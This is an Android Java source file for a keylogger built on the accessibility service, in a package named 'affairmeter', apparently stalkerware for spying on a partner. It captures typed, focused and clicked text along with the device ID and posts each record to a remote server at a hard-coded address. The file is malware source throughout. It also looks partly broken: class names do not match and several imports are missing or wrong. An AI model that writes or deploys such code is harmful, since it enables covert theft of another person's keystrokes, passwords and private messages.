package self.affairmeter.client.listener;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.support.constraint.solver.widgets.Helper;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

public class KeyListener extends AccessibilityService {
    private final static String LOG_TAG = Helper.getLogTag(KeyLogger.class);
    @Override
    public void onServiceConnected() {
        Log.i(LOG_TAG, "Starting service");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        TelephonyManager tManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
        String uuid = tManager.getDeviceId();
        Date now = DateTimeHelper.getCurrentDay();
        String accessibilityEvent = null;
        String msg = null;

        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
                accessibilityEvent = "TYPE_VIEW_TEXT_CHANGED";
                msg = String.valueOf(event.getText());
                break;
            }
            case AccessibilityEvent.TYPE_VIEW_FOCUSED: {
                accessibilityEvent = "TYPE_VIEW_FOCUSED";
                msg = String.valueOf(event.getText());
                break;
            }
            case AccessibilityEvent.TYPE_VIEW_CLICKED: {
                accessibilityEvent = "TYPE_VIEW_CLICKED";
                msg = String.valueOf(event.getText());
                break;
            }
            default:
        }

        if (accessibilityEvent == null) {
            return;
        }

        Log.i(LOG_TAG, msg);

        KeyLog keyLog = new KeyLog();
        keyLog.setUuid(uuid);
        keyLog.setKeyLogDate(now);
        keyLog.setAccessibilityEvent(accessibilityEvent);
        keyLog.setMsg(msg);

        sendLog("http://192.168.1.29:8080/keylog/save", keyLog);
    }

    private Map<String, String> getMap(KeyLog keyLog) throws IllegalAccessException {
        Map<String, String> result = new LinkedHashMap<>();
        result.put("uuid", keyLog.getUuid());
        result.put("keyLogDate", DateTimeHelper.getTheDateInString(keyLog.getKeyLogDate()));
        result.put("accessibilityEvent", keyLog.getAccessibilityEvent());
        result.put("msg", keyLog.getMsg());
        return result;
    }


    private void sendLog(String uploadUrl, KeyLog keyLog) {

        try {
            RequestQueue requestQueue = Volley.newRequestQueue(this);
            JsonObjectRequest keyLogRequest = new JsonObjectRequest(uploadUrl
                    , new JSONObject(getMap(keyLog))
                    , this::onResponse
                    , this::onErrorResponse
            );
            Log.i(LOG_TAG, String.valueOf(keyLogRequest.getHeaders()));
            Log.i(LOG_TAG, new String(keyLogRequest.getBody()));
            requestQueue.add(keyLogRequest);
        } catch (AuthFailureError | IllegalAccessException authFailureError) {
            authFailureError.printStackTrace();
        }
    }

    private void onResponse(JSONObject response) {
        Log.i(LOG_TAG, "Response is : " + response);
    }

    private void onErrorResponse(VolleyError error) {
        Log.e(LOG_TAG, error.getMessage());
    }

    @Override
    public void onInterrupt() {

    }
}
